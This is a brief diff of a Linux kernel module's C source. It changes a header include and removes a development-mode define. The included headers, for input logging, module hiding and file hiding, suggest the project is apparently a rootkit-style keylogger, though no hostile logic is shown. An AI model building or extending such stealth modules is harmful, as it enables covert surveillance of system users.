@@ -4,13 +4,11 @@
 #include <linux/kernel.h>	 // For KERN_INFO
 #include <linux/init.h>	
 
-#include "environmentSpecificOptions.h"
+#include "common.h"
 #include "logInput.h"
 #include "moduleHide.h"
 #include "fileHide.h"
 #include "outputDevice.h"
-
-#define DEV_MODE
 
 static int __init main_init(void) {
 	int error;
